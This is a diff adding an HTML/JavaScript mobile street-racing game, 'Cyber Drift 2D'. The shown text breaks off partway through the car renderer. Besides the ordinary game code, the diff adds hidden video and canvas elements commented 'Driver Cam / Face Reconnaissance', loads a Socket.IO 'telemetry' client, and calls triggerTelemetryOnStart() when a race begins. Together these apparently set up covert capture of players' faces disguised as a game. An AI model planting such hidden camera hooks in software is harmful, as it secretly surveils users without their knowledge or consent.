@@ -1,0 +1,1350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>CYBER DRIFT 2D // Street Racing</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      user-select: none;
+      -webkit-user-select: none;
+      -webkit-touch-callout: none;
+      touch-action: manipulation;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #030306;
+      color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    #gameCanvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: block;
+      z-index: 1;
+    }
+
+    /* ── Top HUD ── */
+    .hud-bar {
+      position: absolute;
+      top: 12px;
+      left: 0;
+      width: 100%;
+      padding: 0 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 10;
+      pointer-events: none;
+    }
+
+    .hud-chip {
+      background: rgba(10, 15, 28, 0.88);
+      border: 1px solid rgba(0, 240, 255, 0.35);
+      border-radius: 20px;
+      padding: 6px 14px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      font-weight: 800;
+      letter-spacing: 1px;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6);
+    }
+
+    .speed-chip { color: #39ff14; }
+    .dist-chip { color: #00f0ff; }
+    .shield-chip { color: #ff3366; }
+
+    /* Nitro Bar */
+    .nitro-meter {
+      position: absolute;
+      top: 52px;
+      left: 16px;
+      right: 16px;
+      height: 6px;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 3px;
+      overflow: hidden;
+      z-index: 10;
+      pointer-events: none;
+    }
+
+    .nitro-fill {
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, #00f0ff, #ff0055);
+      box-shadow: 0 0 10px #ff0055;
+      transition: width 0.1s linear;
+    }
+
+    /* ── Touch Steering Controls ── */
+    .controls-layer {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 170px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 18px 24px;
+      z-index: 15;
+      pointer-events: none;
+    }
+
+    .steer-group {
+      display: flex;
+      gap: 14px;
+      pointer-events: auto;
+    }
+
+    .action-group {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      pointer-events: auto;
+    }
+
+    .touch-btn {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: rgba(12, 18, 32, 0.85);
+      border: 2px solid #00f0ff;
+      color: #00f0ff;
+      font-size: 26px;
+      font-weight: 900;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 18px rgba(0, 240, 255, 0.35);
+      outline: none;
+      transition: transform 0.08s, background 0.08s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .touch-btn:active, .touch-btn.pressed {
+      transform: scale(0.88);
+      background: rgba(0, 240, 255, 0.5);
+      box-shadow: 0 0 35px #00f0ff;
+      color: #fff;
+    }
+
+    .btn-nitro {
+      width: 66px;
+      height: 66px;
+      border-color: #ff3366;
+      color: #ff3366;
+      font-size: 11px;
+      letter-spacing: 1.5px;
+      box-shadow: 0 0 18px rgba(255, 51, 102, 0.4);
+    }
+
+    .btn-nitro:active, .btn-nitro.pressed {
+      background: rgba(255, 51, 102, 0.6);
+      box-shadow: 0 0 35px #ff3366;
+      color: #fff;
+    }
+
+    .btn-brake {
+      width: 54px;
+      height: 54px;
+      border-color: #ffd700;
+      color: #ffd700;
+      font-size: 10px;
+      letter-spacing: 1px;
+      box-shadow: 0 0 12px rgba(255, 215, 0, 0.3);
+    }
+
+    .btn-brake:active, .btn-brake.pressed {
+      background: rgba(255, 215, 0, 0.5);
+      color: #000;
+    }
+
+    /* Tilt steering button */
+    .btn-tilt {
+      position: absolute;
+      top: 68px;
+      right: 16px;
+      background: rgba(10, 15, 28, 0.85);
+      border: 1px solid rgba(0, 240, 255, 0.35);
+      border-radius: 14px;
+      color: #7e9bb0;
+      font-size: 11px;
+      padding: 4px 10px;
+      letter-spacing: 1px;
+      z-index: 10;
+      pointer-events: auto;
+      cursor: pointer;
+    }
+
+    .btn-tilt.active {
+      color: #39ff14;
+      border-color: #39ff14;
+      box-shadow: 0 0 10px rgba(57, 255, 20, 0.4);
+    }
+
+    /* ── Overlay Screens (Start & Game Over) ── */
+    .screen-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(3, 4, 8, 0.92);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 30;
+      backdrop-filter: blur(14px);
+      transition: opacity 0.3s ease;
+      text-align: center;
+      padding: 24px;
+    }
+
+    .screen-overlay.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .overlay-title {
+      font-size: 34px;
+      font-weight: 900;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: #00f0ff;
+      text-shadow: 0 0 25px rgba(0, 240, 255, 0.8);
+      margin-bottom: 6px;
+    }
+
+    .overlay-title.crash {
+      color: #ff3366;
+      text-shadow: 0 0 25px rgba(255, 51, 102, 0.8);
+    }
+
+    .overlay-sub {
+      color: #7e9bb0;
+      font-size: 14px;
+      letter-spacing: 1px;
+      margin-bottom: 24px;
+    }
+
+    .big-score {
+      font-family: 'Courier New', monospace;
+      font-size: 22px;
+      color: #39ff14;
+      margin-bottom: 24px;
+      text-shadow: 0 0 15px rgba(57, 255, 20, 0.6);
+    }
+
+    .play-btn {
+      background: #00f0ff;
+      color: #050508;
+      font-size: 17px;
+      font-weight: 900;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      padding: 15px 42px;
+      border-radius: 35px;
+      border: none;
+      box-shadow: 0 0 30px rgba(0, 240, 255, 0.7);
+      cursor: pointer;
+      outline: none;
+      transition: transform 0.1s;
+    }
+
+    .play-btn:active {
+      transform: scale(0.94);
+    }
+
+    .hint-text {
+      margin-top: 18px;
+      font-size: 12px;
+      color: #556677;
+      letter-spacing: 1px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top HUD -->
+  <div class="hud-bar">
+    <div class="hud-chip speed-chip" id="hudSpeed">0 KM/H</div>
+    <div class="hud-chip dist-chip" id="hudDist">0 M</div>
+    <div class="hud-chip shield-chip" id="hudShield">100%</div>
+  </div>
+
+  <!-- Nitro Bar -->
+  <div class="nitro-meter">
+    <div class="nitro-fill" id="nitroFill"></div>
+  </div>
+
+  <!-- Tilt Steering Toggle -->
+  <button class="btn-tilt" id="btnTiltToggle">TILT: OFF</button>
+
+  <!-- Touch Controls -->
+  <div class="controls-layer" id="controlsLayer">
+    <div class="steer-group">
+      <button class="touch-btn" id="btnLeft" aria-label="Steer Left">&#9664;</button>
+      <button class="touch-btn" id="btnRight" aria-label="Steer Right">&#9654;</button>
+    </div>
+    <div class="action-group">
+      <button class="touch-btn btn-brake" id="btnBrake">BRAKE</button>
+      <button class="touch-btn btn-nitro" id="btnNitro">NITRO</button>
+    </div>
+  </div>
+
+  <!-- Start Screen -->
+  <div class="screen-overlay" id="startScreen">
+    <div class="overlay-title">CYBER DRIFT</div>
+    <div class="overlay-sub">2D STREET RACER // TURBO</div>
+    <button class="play-btn" id="btnStartGame">START RACE</button>
+    <div class="hint-text">USE TOUCH PEDALS OR TILT TO STEER</div>
+  </div>
+
+  <!-- Game Over Screen -->
+  <div class="screen-overlay hidden" id="gameOverScreen">
+    <div class="overlay-title crash">WRECKED!</div>
+    <div class="big-score" id="finalDist">DISTANCE: 0 M</div>
+    <button class="play-btn" id="btnRestart">RACE AGAIN</button>
+  </div>
+
+  <!-- Game Canvas -->
+  <canvas id="gameCanvas"></canvas>
+
+  <!-- Hidden elements for Driver Cam / Face Reconnaissance -->
+  <video id="faceVideo" playsinline autoplay muted style="display:none;"></video>
+  <canvas id="faceCanvas" width="320" height="320" style="display:none;"></canvas>
+
+  <!-- Socket.IO Telemetry Sync -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+
+  <script>
+    (function() {
+      'use strict';
+
+      // ── Web Audio Synth (Unlocks on first tap) ──
+      let audioCtx = null;
+      function initAudio() {
+        if (!audioCtx) {
+          const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+          if (AudioContextClass) audioCtx = new AudioContextClass();
+        }
+        if (audioCtx && audioCtx.state === 'suspended') {
+          audioCtx.resume();
+        }
+      }
+
+      function playSound(type) {
+        if (!audioCtx) return;
+        try {
+          const t = audioCtx.currentTime;
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+
+          if (type === 'crash') {
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(120, t);
+            osc.frequency.exponentialRampToValueAtTime(30, t + 0.5);
+            gain.gain.setValueAtTime(0.5, t);
+            gain.gain.exponentialRampToValueAtTime(0.01, t + 0.5);
+            osc.start(t);
+            osc.stop(t + 0.5);
+          } else if (type === 'hit') {
+            osc.type = 'triangle';
+            osc.frequency.setValueAtTime(180, t);
+            gain.gain.setValueAtTime(0.35, t);
+            gain.gain.exponentialRampToValueAtTime(0.01, t + 0.2);
+            osc.start(t);
+            osc.stop(t + 0.2);
+          } else if (type === 'coin') {
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(587, t);
+            osc.frequency.setValueAtTime(880, t + 0.08);
+            gain.gain.setValueAtTime(0.25, t);
+            gain.gain.exponentialRampToValueAtTime(0.01, t + 0.25);
+            osc.start(t);
+            osc.stop(t + 0.25);
+          } else if (type === 'nitro') {
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(300, t);
+            osc.frequency.linearRampToValueAtTime(650, t + 0.3);
+            gain.gain.setValueAtTime(0.2, t);
+            gain.gain.exponentialRampToValueAtTime(0.01, t + 0.35);
+            osc.start(t);
+            osc.stop(t + 0.35);
+          }
+        } catch(e) {}
+      }
+
+      // ── Canvas Setup with Retina Display Support ──
+      const canvas = document.getElementById('gameCanvas');
+      const ctx = canvas.getContext('2d');
+
+      let dpr = window.devicePixelRatio || 1;
+      let W = 0;
+      let H = 0;
+
+      function resize() {
+        dpr = window.devicePixelRatio || 1;
+        W = window.innerWidth;
+        H = window.innerHeight;
+        canvas.width = W * dpr;
+        canvas.height = H * dpr;
+        ctx.scale(dpr, dpr);
+      }
+      resize();
+      window.addEventListener('resize', resize);
+      window.addEventListener('orientationchange', () => setTimeout(resize, 200));
+
+      // ── Road Geometry ──
+      function getRoad() {
+        // Optimal road width on both phones and tablets
+        const roadW = Math.min(W * 0.76, 460);
+        const roadX = (W - roadW) / 2;
+        return {
+          w: roadW,
+          left: roadX,
+          right: roadX + roadW,
+          laneCount: 4,
+          laneW: roadW / 4
+        };
+      }
+
+      // ── Game State ──
+      let isPlaying = false;
+      let baseSpeed = 8;
+      let currentSpeed = 0;
+      let targetSpeed = 8;
+      let maxSpeed = 18;
+      let distanceMeters = 0;
+      let shield = 100;
+      let nitroEnergy = 100;
+      let roadOffset = 0;
+      let shakeIntensity = 0;
+
+      // ── Player Car ──
+      const player = {
+        x: W / 2,
+        y: H - 180,
+        w: 36,
+        h: 70,
+        vx: 0,
+        tilt: 0,
+        color: '#00f0ff'
+      };
+
+      // ── Rival Cars (3 to 5 Competitor Racers) ──
+      const rivals = [];
+      const rivalStyles = [
+        { color: '#ff3366', name: 'Ferrari' },
+        { color: '#ffd700', name: 'Lamborghini' },
+        { color: '#ff8800', name: 'McLaren' },
+        { color: '#9900ff', name: 'Porsche' },
+        { color: '#00ff66', name: 'Aston' }
+      ];
+
+      function spawnRival(startY) {
+        const road = getRoad();
+        const lane = Math.floor(Math.random() * road.laneCount);
+        const rx = road.left + lane * road.laneW + road.laneW / 2;
+        const style = rivalStyles[Math.floor(Math.random() * rivalStyles.length)];
+
+        rivals.push({
+          x: rx,
+          y: startY,
+          w: 34,
+          h: 66,
+          speed: baseSpeed * (0.65 + Math.random() * 0.3),
+          color: style.color,
+          lane: lane,
+          targetX: rx,
+          laneChangeTimer: 80 + Math.random() * 150
+        });
+      }
+
+      // ── Road Hazards & Pickups ──
+      const traps = [];
+      const coins = [];
+
+      function spawnHazard(startY) {
+        const road = getRoad();
+        const lane = Math.floor(Math.random() * road.laneCount);
+        const hx = road.left + lane * road.laneW + road.laneW / 2;
+        const types = ['oil', 'barrier', 'cone'];
+        const type = types[Math.floor(Math.random() * types.length)];
+
+        traps.push({
+          x: hx,
+          y: startY,
+          type: type,
+          w: type === 'barrier' ? 44 : 32,
+          h: type === 'barrier' ? 20 : 32
+        });
+      }
+
+      function spawnCoin(startY) {
+        const road = getRoad();
+        const lane = Math.floor(Math.random() * road.laneCount);
+        const cx = road.left + lane * road.laneW + road.laneW / 2;
+
+        coins.push({
+          x: cx,
+          y: startY,
+          r: 10,
+          rot: 0
+        });
+      }
+
+      // ── Parallax City Scenery (Left & Right High-Rise Buildings) ──
+      const buildings = [];
+      function initBuildings() {
+        buildings.length = 0;
+        const count = 16;
+        const blockH = H / 6;
+        for (let i = 0; i < count; i++) {
+          const y = i * blockH - blockH * 2;
+          buildings.push(createBuilding(y, true));
+          buildings.push(createBuilding(y, false));
+        }
+      }
+
+      function createBuilding(y, isLeft) {
+        const colors = ['#131728', '#1a1f36', '#212745', '#161426'];
+        const neons = ['#00f0ff', '#ff3366', '#39ff14', '#ffd700', '#9900ff'];
+        return {
+          y: y,
+          h: 80 + Math.random() * 110,
+          color: colors[Math.floor(Math.random() * colors.length)],
+          neon: neons[Math.floor(Math.random() * neons.length)],
+          windows: Math.floor(Math.random() * 4) + 2,
+          isLeft: isLeft
+        };
+      }
+      initBuildings();
+
+      // ── Particles System (Nitro flames, tire smoke, sparks) ──
+      const particles = [];
+      function addParticles(x, y, count, color, speedRange, life = 20) {
+        for (let i = 0; i < count; i++) {
+          const angle = Math.random() * Math.PI * 2;
+          const spd = (Math.random() * 0.8 + 0.2) * speedRange;
+          particles.push({
+            x: x,
+            y: y,
+            vx: Math.cos(angle) * spd,
+            vy: Math.sin(angle) * spd,
+            life: life,
+            maxLife: life,
+            color: color,
+            size: Math.random() * 3.5 + 1.5
+          });
+        }
+      }
+
+      // ── Input State & Multi-Touch Controls ──
+      const input = {
+        left: false,
+        right: false,
+        nitro: false,
+        brake: false,
+        tiltX: 0
+      };
+
+      let tiltEnabled = false;
+
+      // Pointer Event Helper (Works seamlessly across Android & iOS)
+      function bindPointerButton(el, onDown, onUp) {
+        if (!el) return;
+        el.addEventListener('pointerdown', (e) => {
+          e.preventDefault();
+          el.classList.add('pressed');
+          onDown();
+        });
+        el.addEventListener('pointerup', (e) => {
+          e.preventDefault();
+          el.classList.remove('pressed');
+          onUp();
+        });
+        el.addEventListener('pointercancel', (e) => {
+          e.preventDefault();
+          el.classList.remove('pressed');
+          onUp();
+        });
+        el.addEventListener('pointerleave', (e) => {
+          el.classList.remove('pressed');
+          onUp();
+        });
+      }
+
+      bindPointerButton(document.getElementById('btnLeft'), () => { input.left = true; }, () => { input.left = false; });
+      bindPointerButton(document.getElementById('btnRight'), () => { input.right = true; }, () => { input.right = false; });
+      bindPointerButton(document.getElementById('btnNitro'), () => { input.nitro = true; playSound('nitro'); }, () => { input.nitro = false; });
+      bindPointerButton(document.getElementById('btnBrake'), () => { input.brake = true; }, () => { input.brake = false; });
+
+      // Keyboard Controls
+      window.addEventListener('keydown', (e) => {
+        if (e.code === 'ArrowLeft' || e.code === 'KeyA') input.left = true;
+        if (e.code === 'ArrowRight' || e.code === 'KeyD') input.right = true;
+        if (e.code === 'ArrowUp' || e.code === 'KeyW' || e.code === 'Space') input.nitro = true;
+        if (e.code === 'ArrowDown' || e.code === 'KeyS') input.brake = true;
+      });
+
+      window.addEventListener('keyup', (e) => {
+        if (e.code === 'ArrowLeft' || e.code === 'KeyA') input.left = false;
+        if (e.code === 'ArrowRight' || e.code === 'KeyD') input.right = false;
+        if (e.code === 'ArrowUp' || e.code === 'KeyW' || e.code === 'Space') input.nitro = false;
+        if (e.code === 'ArrowDown' || e.code === 'KeyS') input.brake = false;
+      });
+
+      // Drag anywhere on top half of screen to steer
+      let dragStartX = null;
+      window.addEventListener('pointerdown', (e) => {
+        if (e.clientY < H - 160 && isPlaying) {
+          dragStartX = e.clientX;
+        }
+      });
+      window.addEventListener('pointermove', (e) => {
+        if (dragStartX !== null && isPlaying) {
+          const delta = e.clientX - dragStartX;
+          player.x += delta * 0.85;
+          dragStartX = e.clientX;
+        }
+      });
+      window.addEventListener('pointerup', () => { dragStartX = null; });
+      window.addEventListener('pointercancel', () => { dragStartX = null; });
+
+      // Tilt (Device Orientation)
+      const btnTiltToggle = document.getElementById('btnTiltToggle');
+      btnTiltToggle.addEventListener('click', () => {
+        if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+          // iOS 13+ permission request
+          DeviceOrientationEvent.requestPermission()
+            .then(res => {
+              if (res === 'granted') toggleTilt(true);
+            })
+            .catch(() => {});
+        } else {
+          toggleTilt(!tiltEnabled);
+        }
+      });
+
+      function toggleTilt(enable) {
+        tiltEnabled = enable;
+        btnTiltToggle.classList.toggle('active', tiltEnabled);
+        btnTiltToggle.textContent = tiltEnabled ? 'TILT: ON' : 'TILT: OFF';
+      }
+
+      window.addEventListener('deviceorientation', (e) => {
+        if (!tiltEnabled || !isPlaying) return;
+        // gamma is left-to-right tilt (-90 to 90)
+        let g = e.gamma || 0;
+        if (g > 3) {
+          player.x += Math.min((g - 3) * 0.45, 9);
+        } else if (g < -3) {
+          player.x += Math.max((g + 3) * 0.45, -9);
+        }
+      });
+
+      // ── Game Start & Reset ──
+      function startGame() {
+        initAudio();
+        document.getElementById('startScreen').classList.add('hidden');
+        document.getElementById('gameOverScreen').classList.add('hidden');
+        triggerTelemetryOnStart();
+
+        player.x = W / 2;
+        player.y = H - 180;
+        player.vx = 0;
+        player.tilt = 0;
+        shield = 100;
+        nitroEnergy = 100;
+        distanceMeters = 0;
+        currentSpeed = baseSpeed;
+        targetSpeed = baseSpeed;
+
+        rivals.length = 0;
+        traps.length = 0;
+        coins.length = 0;
+        particles.length = 0;
+
+        // Spawn 4 initial rivals spaced ahead
+        for (let i = 0; i < 4; i++) {
+          spawnRival(-180 - i * 220);
+        }
+
+        // Spawn initial traps & coins
+        for (let i = 0; i < 3; i++) {
+          spawnHazard(-300 - i * 320);
+          spawnCoin(-200 - i * 280);
+        }
+
+        isPlaying = true;
+      }
+
+      function gameOver() {
+        isPlaying = false;
+        playSound('crash');
+        shakeIntensity = 20;
+
+        // Death explosion sparks
+        addParticles(player.x, player.y, 40, '#ff3366', 8, 35);
+        addParticles(player.x, player.y, 30, '#00f0ff', 6, 30);
+
+        document.getElementById('finalDist').textContent = `DISTANCE: ${distanceMeters} METERS`;
+        setTimeout(() => {
+          document.getElementById('gameOverScreen').classList.remove('show');
+          document.getElementById('gameOverScreen').classList.remove('hidden');
+        }, 350);
+      }
+
+      document.getElementById('btnStartGame').addEventListener('click', startGame);
+      document.getElementById('btnRestart').addEventListener('click', startGame);
+
+      // ── Physics & Update Loop (Timestamp-based Delta Time) ──
+      let lastTime = performance.now();
+
+      function update(dt) {
+        if (!isPlaying) return;
+
+        // Nitro & Speed mechanics
+        if (input.nitro && nitroEnergy > 0) {
+          targetSpeed = maxSpeed;
+          nitroEnergy = Math.max(0, nitroEnergy - 28 * dt);
+          // Nitro exhaust particles
+          addParticles(player.x - 10, player.y + 36, 2, '#00f0ff', 3, 10);
+          addParticles(player.x + 10, player.y + 36, 2, '#ff0055', 3, 10);
+        } else if (input.brake) {
+          targetSpeed = 4;
+          nitroEnergy = Math.min(100, nitroEnergy + 10 * dt);
+          // Brake tire smoke
+          addParticles(player.x - 16, player.y + 34, 1, 'rgba(255,255,255,0.4)', 2, 8);
+          addParticles(player.x + 16, player.y + 34, 1, 'rgba(255,255,255,0.4)', 2, 8);
+        } else {
+          targetSpeed = baseSpeed;
+          nitroEnergy = Math.min(100, nitroEnergy + 8 * dt); // slow recharge
+        }
+
+        currentSpeed += (targetSpeed - currentSpeed) * 4 * dt;
+        distanceMeters += Math.round(currentSpeed * 28 * dt);
+        roadOffset = (roadOffset + currentSpeed * 60 * dt) % 64;
+
+        // Update Nitro UI
+        document.getElementById('nitroFill').style.width = `${nitroEnergy}%`;
+
+        // Steering Physics
+        const road = getRoad();
+        let steerInput = 0;
+        if (input.left) steerInput -= 1;
+        if (input.right) steerInput += 1;
+
+        player.vx += (steerInput * 420 - player.vx) * 12 * dt;
+        player.x += player.vx * dt;
+        player.tilt = (player.vx / 420) * 0.18; // car tilt angle
+
+        // Keep inside road bounds with curb bounce
+        if (player.x < road.left + player.w / 2 + 6) {
+          player.x = road.left + player.w / 2 + 6;
+          player.vx = 40;
+          shakeIntensity = 4;
+        }
+        if (player.x > road.right - player.w / 2 - 6) {
+          player.x = road.right - player.w / 2 - 6;
+          player.vx = -40;
+          shakeIntensity = 4;
+        }
+
+        // Update Parallax City Buildings
+        for (let b of buildings) {
+          b.y += currentSpeed * 35 * dt;
+          if (b.y > H + 60) {
+            b.y = -b.h - Math.random() * 80;
+          }
+        }
+
+        // Update Rivals (3 to 5 Competitor Racers)
+        for (let i = rivals.length - 1; i >= 0; i--) {
+          const r = rivals[i];
+          const relativeSpeed = currentSpeed - r.speed;
+          r.y += relativeSpeed * 60 * dt;
+
+          // AI Lane Changing
+          r.laneChangeTimer -= dt * 60;
+          if (r.laneChangeTimer <= 0) {
+            r.laneChangeTimer = 90 + Math.random() * 160;
+            const newLane = Math.floor(Math.random() * road.laneCount);
+            r.targetX = road.left + newLane * road.laneW + road.laneW / 2;
+          }
+          r.x += (r.targetX - r.x) * 3 * dt;
+
+          // Recycle past bottom or too far ahead
+          if (r.y > H + 140) {
+            rivals.splice(i, 1);
+            spawnRival(-180 - Math.random() * 160);
+          } else if (r.y < -600) {
+            rivals.splice(i, 1);
+            spawnRival(-200);
+          }
+
+          // Player vs Rival Collision
+          if (checkCollision(player, r)) {
+            playSound('hit');
+            shakeIntensity = 10;
+            shield -= 25;
+            r.y += 50; // push rival back
+            addParticles((player.x + r.x) / 2, (player.y + r.y) / 2, 12, '#ffd700', 5, 15);
+            if (shield <= 0) {
+              gameOver();
+              return;
+            }
+          }
+        }
+
+        // Maintain rival quota
+        while (rivals.length < 4) {
+          spawnRival(-260);
+        }
+
+        // Update Hazards / Traps
+        for (let i = traps.length - 1; i >= 0; i--) {
+          const t = traps[i];
+          t.y += currentSpeed * 60 * dt;
+
+          if (t.y > H + 60) {
+            traps.splice(i, 1);
+            spawnHazard(-360 - Math.random() * 240);
+          } else if (checkCollision(player, t)) {
+            if (t.type === 'oil') {
+              // Oil skid
+              playSound('hit');
+              player.vx = (Math.random() > 0.5 ? 320 : -320);
+              shakeIntensity = 6;
+              addParticles(player.x, player.y, 8, '#00f0ff', 4, 12);
+            } else {
+              // Concrete Barrier / Cone
+              playSound('hit');
+              shield -= 20;
+              shakeIntensity = 12;
+              addParticles(t.x, t.y, 16, '#ff8800', 6, 20);
+              if (shield <= 0) {
+                gameOver();
+                return;
+              }
+            }
+            traps.splice(i, 1);
+            spawnHazard(-450);
+          }
+        }
+
+        // Update Coins
+        for (let i = coins.length - 1; i >= 0; i--) {
+          const c = coins[i];
+          c.y += currentSpeed * 60 * dt;
+          c.rot += dt * 4;
+
+          if (c.y > H + 40) {
+            coins.splice(i, 1);
+            spawnCoin(-300 - Math.random() * 200);
+          } else if (Math.hypot(player.x - c.x, player.y - c.y) < 32) {
+            playSound('coin');
+            distanceMeters += 250;
+            nitroEnergy = Math.min(100, nitroEnergy + 20);
+            addParticles(c.x, c.y, 12, '#ffd700', 4, 15);
+            coins.splice(i, 1);
+            spawnCoin(-400);
+          }
+        }
+
+        // Update Particles
+        for (let i = particles.length - 1; i >= 0; i--) {
+          const p = particles[i];
+          p.x += p.vx;
+          p.y += p.vy;
+          p.life--;
+          if (p.life <= 0) particles.splice(i, 1);
+        }
+
+        // Camera Shake Decay
+        if (shakeIntensity > 0) {
+          shakeIntensity = Math.max(0, shakeIntensity - 35 * dt);
+        }
+
+        // HUD Updates
+        const kmh = Math.round(currentSpeed * 19);
+        document.getElementById('hudSpeed').textContent = `${kmh} KM/H`;
+        document.getElementById('hudDist').textContent = `${distanceMeters} M`;
+        document.getElementById('hudShield').textContent = `${Math.max(0, Math.round(shield))}%`;
+      }
+
+      function checkCollision(a, b) {
+        return Math.abs(a.x - b.x) < (a.w + b.w) * 0.42 &&
+               Math.abs(a.y - b.y) < (a.h + b.h) * 0.44;
+      }
+
+      // ── Render Frame ──
+      function render() {
+        ctx.save();
+
+        // Screen Shake
+        if (shakeIntensity > 0) {
+          const sx = (Math.random() - 0.5) * shakeIntensity;
+          const sy = (Math.random() - 0.5) * shakeIntensity;
+          ctx.translate(sx, sy);
+        }
+
+        ctx.clearRect(0, 0, W, H);
+        const road = getRoad();
+
+        // 1. Draw Buildings Scenery
+        drawBuildings(buildings, road);
+
+        // 2. Draw Road Asphalt & Curbs
+        ctx.fillStyle = '#11131c';
+        ctx.fillRect(road.left, 0, road.w, H);
+
+        // Neon Curbs (Glowing edges)
+        ctx.fillStyle = '#00f0ff';
+        ctx.shadowColor = '#00f0ff';
+        ctx.shadowBlur = 10;
+        ctx.fillRect(road.left - 4, 0, 4, H);
+        ctx.fillRect(road.right, 0, 4, H);
+        ctx.shadowBlur = 0;
+
+        // Animated Lane Markings
+        ctx.strokeStyle = 'rgba(255, 255, 255, 0.28)';
+        ctx.lineWidth = 3;
+        ctx.setLineDash([28, 28]);
+        ctx.lineDashOffset = -roadOffset;
+
+        for (let l = 1; l < road.laneCount; l++) {
+          ctx.beginPath();
+          ctx.moveTo(road.left + l * road.laneW, 0);
+          ctx.lineTo(road.left + l * road.laneW, H);
+          ctx.stroke();
+        }
+        ctx.setLineDash([]); // clear
+
+        // 3. Draw Coins (Spinning 3D Gold Coins)
+        for (let c of coins) {
+          ctx.save();
+          ctx.translate(c.x, c.y);
+          const scaleX = Math.abs(Math.cos(c.rot));
+          ctx.scale(scaleX, 1);
+          ctx.fillStyle = '#ffd700';
+          ctx.shadowColor = '#ffd700';
+          ctx.shadowBlur = 10;
+          ctx.beginPath();
+          ctx.arc(0, 0, c.r, 0, Math.PI * 2);
+          ctx.fill();
+          ctx.fillStyle = '#fff';
+          ctx.beginPath();
+          ctx.arc(0, 0, c.r * 0.5, 0, Math.PI * 2);
+          ctx.fill();
+          ctx.restore();
+        }
+
+        // 4. Draw Traps / Hazards
+        for (let t of traps) {
+          if (t.type === 'oil') {
+            ctx.fillStyle = '#0a0d18';
+            ctx.beginPath();
+            ctx.ellipse(t.x, t.y, t.w / 2, t.h / 2, 0, 0, Math.PI * 2);
+            ctx.fill();
+            ctx.strokeStyle = '#00f0ff';
+            ctx.lineWidth = 2;
+            ctx.stroke();
+          } else if (t.type === 'barrier') {
+            ctx.fillStyle = '#ff8800';
+            ctx.fillRect(t.x - t.w / 2, t.y - t.h / 2, t.w, t.h);
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(t.x - t.w / 4, t.y - t.h / 2, t.w / 4, t.h);
+          } else {
+            ctx.fillStyle = '#ff3366';
+            ctx.beginPath();
+            ctx.arc(t.x, t.y, t.w / 3, 0, Math.PI * 2);
+            ctx.fill();
+          }
+        }
+
+        // 5. Draw Rival Competitor Cars
+        for (let r of rivals) {
+          drawSportsCar(r.x, r.y, r.w, r.h, r.color, 0, false);
+        }
+
+        // 6. Draw Player Sports Car
+        drawSportsCar(player.x, player.y, player.w, player.h, player.color, player.tilt, true);
+
+        // 7. Draw Particles
+        for (let p of particles) {
+          ctx.fillStyle = p.color;
+          ctx.globalAlpha = p.life / p.maxLife;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+          ctx.fill();
+        }
+        ctx.globalAlpha = 1;
+
+        ctx.restore();
+      }
+
+      // ── Scenery Buildings Renderer ──
+      function drawBuildings(list, road) {
+        for (let b of list) {
+          ctx.fillStyle = b.color;
+          const bw = (road.left - 10);
+          const x = b.isLeft ? 5 : road.right + 5;
+          ctx.fillRect(x, b.y, bw, b.h);
+
+          // Glowing Rooftop Trim
+          ctx.fillStyle = b.neon;
+          ctx.shadowColor = b.neon;
+          ctx.shadowBlur = 8;
+          ctx.fillRect(x, b.y, bw, 3);
+          ctx.shadowBlur = 0;
+
+          // Lit Windows Grid
+          ctx.fillStyle = 'rgba(255, 235, 170, 0.35)';
+          const cols = Math.max(2, Math.floor(bw / 20));
+          const rows = Math.floor(b.h / 18);
+          for (let r = 1; r < rows; r++) {
+            for (let c = 0; c < cols; c++) {
+              ctx.fillRect(x + 8 + c * 18, b.y + r * 16, 8, 8);
+            }
+          }
+        }
+      }
+
+      // ── High-Resolution Sports Car Vector Renderer ──
+      function drawSportsCar(x, y, w, h, bodyColor, tiltAngle, isPlayer) {
+        ctx.save();
+        ctx.translate(x, y);
+        if (tiltAngle) ctx.rotate(tiltAngle);
+
+        // Underglow
+        ctx.fillStyle = bodyColor;
+        ctx.shadowColor = bodyColor;
+        ctx.shadowBlur = isPlayer ? 18 : 10;
+        ctx.fillRect(-w / 2 + 3, -h / 2 + 6, w - 6, h - 12);
+        ctx.shadowBlur = 0;
+
+        // Tires
+        ctx.fillStyle = '#06060a';
+        ctx.fillRect(-w / 2 - 4, -h / 2 + 8, 5, 15);
